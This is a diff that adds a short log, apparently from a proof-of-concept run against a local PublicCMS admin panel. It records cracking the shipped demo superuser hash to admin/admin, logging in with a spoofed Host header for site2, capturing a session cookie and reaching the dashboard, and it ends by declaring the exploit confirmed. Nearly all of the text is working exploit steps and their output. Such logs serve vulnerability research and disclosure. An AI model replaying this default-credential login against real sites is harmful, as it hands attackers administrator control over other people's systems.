@@ -1,0 +1,9 @@
+[INFO] VULN-001: default-cred demo superuser (admin/admin) via Host: site2.dev.publiccms.com
+[SETUP] hash-crack: sha512(sha512('admin')+salt) == shipped hash  -> credential is admin/admin
+[STEP] POST http://localhost:20000/admin/login  (Host: site2.dev.publiccms.com, username=admin password=admin)
+[INFO] login status=302  cookie=2_670e7a50-500a-467c-a90f-2ac73d71b304
+[OK] authenticated as demo superuser (user id 2) with no operator-set credential
+[STEP] GET http://localhost:20000/admin/index with captured cookie
+[INFO] dashboard status=200
+[OK] exploit confirmed — unauthenticated superuser session on site 2 (dashboard rendered)
+<title>企业中英文站点 - Management system</title>
